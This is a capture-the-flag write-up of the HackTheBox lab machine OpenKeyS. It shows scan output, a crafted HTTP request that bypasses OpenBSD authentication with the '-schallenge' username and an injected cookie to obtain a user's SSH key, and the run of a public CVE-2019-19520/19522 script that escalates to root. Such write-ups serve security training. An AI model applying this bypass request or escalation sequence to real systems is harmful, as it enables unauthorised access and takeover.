---
title: OpenKeyS Machine Writeup- HackTheBox
date: 2020-12-10 00:30:00
excerpt: A linux box from HackTheBox, owned through OS vulnerabilities. Note that this is still an active box, so try a 
         little harder before heading inside. 
thumbnail: /assets/images/OpenKeyS/info.png
categories:
- HTB
- Writeup
- Machine
tags:
- Linux
- OpenBSD
- Authentication Vulnerability
- without metasploit
- Local Privilege Escalation
- CVE-2019-19520
---

![Info](/assets/images/OpenKeyS/info.png)

# Methodology
1. Open Port Enumeration
2. Web Service Enumeration
3. Authentication Vulnerability identified
4. User SSH private key identified
5. User shell gained
6. Local Privilege Escalation Vulnerability identified
7. Root shell gained

# Lessons Learned
1. OpenBSD Authentication Bypass Vulnerability
2. Local Privilege Escalation

# Open Ports Enumeration
The open ports enumeration through targetRecon[^fn1], had identified two open ports namely, **SSH** (22) and 
**HTTP** (80). The scan had not identified any known vulnerabilities on the target. The results of the scan are shown
below.
``` 
┌[b4bygroot☮arcolinux]-(~/HTB/OpenKeyS)
└> targetRecon 10.10.10.199
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
        22      ssh
        80      http
[+] Scripts Scan
                 nmap -sV -A --script=default,vuln -p 22 10.10.10.199
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 00:30 IST
Nmap scan report for 10.10.10.199 (10.10.10.199)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.95 seconds

                 nmap -sV -A --script=default,vuln -p 80 10.10.10.199
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 00:30 IST
Nmap scan report for 10.10.10.199 (10.10.10.199)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Site doesn't have a title (text/html).
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 580.15 seconds

[+] Summary 
22      ssh     OpenSSH 8.1
                No vuln found
80      http    OpenBSD httpd N/A
                No vuln found
```

# Web Service Enumeration
Browsing to [http://openkeys.htb](http://openkeys.htb) had revealed a login page that is supposed to retrieve **SSH
Private Key** for the authenticated user. Following this, a **gobuster** scan was carried out, that had identified an
interesting directory named **includes**. The partial results of the scan are given below.
```shell
λ arcolinux OpenKeyS → gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.199
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.10.199
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Timeout:        10s
===============================================================
2020/12/10 01:31:25 Starting gobuster in directory enumeration mode
===============================================================
/images (Status: 301)        
/css (Status: 301)            
/includes (Status: 301)       
/js (Status: 301)             
/vendor (Status: 301)          
/fonts (Status: 301)    
---SNIP---
```
Browsing to [http://openkeys.htb/includes](http://openkeys.htb/includes) had revealed two files listed on the directory,
named **auth.php** and **auth.php.swp**. Both the files were downloaded onto the attacking host for further analysis. 
Although the extension from *auth.php.swp* indicates that this is a *swap* file, the **file** command had identified few 
key information about the file such as username and host. The same is given on the section below. 
```shell
Ξ HTB/OpenKeyS → file auth.php.swp 
auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
```
Examining the contents of the *swap* file using **vim** as `vim -r auth.php.swp` had revealed that the *authenticate* 
function executes a binary, **check_auth** present on *auth_helpers/check_auth*. The partial contents of the swap 
file is given below.
```php
<?php

function authenticate($username, $password)
{
	$cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
	system($cmd, $retcode);
	return $retcode;
}
---SNIP---
```
The binary *check_auth* was downloaded by browsing to 
[http://openkeys.htb/auth_helpers/check_auth](http://openkeys.htb/auth_helpers/check_auth), and analyzed for an attack
vector.

# Initial Foothold
Analyzing the file *check_auth* with **strings** as `strings check_auth` had revealed few key information, about the
target including **OpenBSD** and **auth_userkey**.
```shell
λ arcolinux OpenKeyS → strings check_auth 
/usr/libexec/ld.so
OpenBSD
libc.so.95.1
_csu_finish
exit
_Jv_RegisterClasses
atexit
auth_userokay
---SNIP---
```
Searching for the combination- *OpenBSD* and *check_auth* had revealed an **authentication bypass vulnerability in 
OpenBSD** [^fn2] [^fn3]. The vulnerability states that authentication on OpenBSD can be bypassed by using **-schallenge**
as the username with any password. Attempting the same on the login from [http://openkeys.htb](http://openkeys.htb)
had managed to bypass authentication, but had ultimately failed in retrieving SSH keys as the target has no user
*-schallenge*. Having found a valid username **jennifer** from the swap file, *auth.php.swp*, a viable method would be to
try and retrieve the SSH key for *jennifer*. To that effect, the login request was intercepted with *BurpSuite* and
a new cookie field, *username* was added to the request as 
`Cookie: PHPSESSID=9h0gbbeul2m6v82drk6eqe3ukb;username=jennifer`. The modified request is given below.
```http 
POST /index.php HTTP/1.1
Host: openkeys.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://openkeys.htb
Connection: close
Referer: http://openkeys.htb/index.php
Cookie: PHPSESSID=9h0gbbeul2m6v82drk6eqe3ukb;username=jennifer
Upgrade-Insecure-Requests: 1

username=-schallenge&password=password
```
Forwarding the modified request had presented the *SSH Private Key* of the user *jennifer* and the same is shown on the
screenshot given below.
![SSH Key](/assets/images/OpenKeyS/jennifer_key.png)

The received key was copied onto a file, named **jennifer.key**, and given appropriate key permissions. An attempt to 
access the target via., **SSH** as the user *jennifer* was carried out as `ssh -i jennifer.key jennifer@openkeys.htb`. 
This gave complete access to the target as the user *jennifer* and the user flag was read. The same is shown below.

```shell
Ξ HTB/OpenKeyS → ssh -i jennifer.key jennifer@openkeys.htb 
The authenticity of host 'openkeys.htb (10.10.10.199)' can't be established.
ECDSA key fingerprint is SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'openkeys.htb,10.10.10.199' (ECDSA) to the list of known hosts.
Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
openkeys$ pwd
/home/jennifer
openkeys$ cat user.txt                                                                                                                                                                                       
36ab2---REDACTED---d2b10
```
![User Shell](/assets/images/OpenKeyS/usershell.png)

# Privilege Escalation
With user access to the target established, enumeration further for privilege escalation was carried out. 
The **uname -a** command had identified the installed OS and version as **OpenBSD 6.6**, shown below.
```shell
openkeys$ uname -a
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
```
*Google-Fu* had listed a privilege escalation vector, **CVE-2019-19520** [^fn4] and a working exploit [^fn5] had been 
identified. The exploit script was copied onto a file, **privEsc.sh**, on the target, given executable permissions and 
executed. This gave complete *root* access to the target and the root flag was read. The same is shown below.
```shell
openkeys$ vi privEsc.sh
openkeys$ chmod +x privEsc.sh                                                                                                                                                                                
openkeys$ ./privEsc.sh                                                                                                                                                                                       
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys# id                                                                                                                                                                                            
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys# cat /root/root.txt                                                                                                                                                                                 
f3a55---REDEACTED---c6efa
```
![Root Shell](/assets/images/OpenKeyS/rootshell.png)

# System Owned
![System Owned](/assets/images/OpenKeyS/sysown.png)

# Resources
[^fn1]:[targetRecon](https://github.com/b4bygroot/TargetRecon)
[^fn2]:[Authentication vulnerabilities in OpenBSD](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt)
[^fn3]:[OpenBSD devs patch authentication bypass bug](https://nakedsecurity.sophos.com/2019/12/06/openbsd-devs-patch-authentication-bypass-bug/)
[^fn4]:[CVE-2019-19520](https://packetstormsecurity.com/files/cve/CVE-2019-19520)
[^fn5]:[bcoles/local-exploits/CVE-2019-19520](https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520)